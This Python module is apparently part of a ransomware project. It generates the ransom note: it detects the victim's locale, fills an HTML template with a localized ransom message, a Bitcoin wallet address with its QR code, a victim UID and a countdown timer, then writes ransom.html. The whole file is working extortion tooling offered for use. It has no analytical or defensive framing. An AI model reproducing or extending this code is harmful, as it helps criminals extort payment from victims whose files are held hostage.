import os
import base64
import qrcode
import locale
from io import BytesIO
from datetime import datetime, timedelta
from ransom.ransom_config import get_ransom_message, BITCOIN_WALLET, DEFAULT_TIMER_SECONDS

TEMPLATE_PATH = "ransom/ransom_template.html"
OUTPUT_PATH = "ransom"

def detect_locale():
    try:
        lang = locale.getdefaultlocale()[0]
    except:
        lang = "en-US"
    return lang if lang else "en-US"

def generate_qrcode_base64(data: str) -> str:
    img = qrcode.make(data)
    buffered = BytesIO()
    img.save(buffered, format="PNG")
    return base64.b64encode(buffered.getvalue()).decode()

def generate_ransom_note(uid: str) -> str:
    os.makedirs(OUTPUT_PATH, exist_ok=True)
    
    locale_code = detect_locale()
    msg = get_ransom_message(locale_code)

    with open(TEMPLATE_PATH, "r", encoding="utf-8") as f:
        template_html = f.read()

    qr_base64 = generate_qrcode_base64(BITCOIN_WALLET)

    ransom_html = template_html.format(
        TITLE=msg["title"],
        BODY=msg["body"],
        FOOTER=msg["footer"].format(UID=uid),
        UID=uid,
        BTC=BITCOIN_WALLET,
        QR_BASE64=qr_base64,
        TIMER=DEFAULT_TIMER_SECONDS
    )

    html_path = os.path.join(OUTPUT_PATH, "ransom.html")
    with open(html_path, "w", encoding="utf-8") as f:
        f.write(ransom_html)

    print(f"[🧬] ransom.html gerado com UID {uid}")
    return html_path
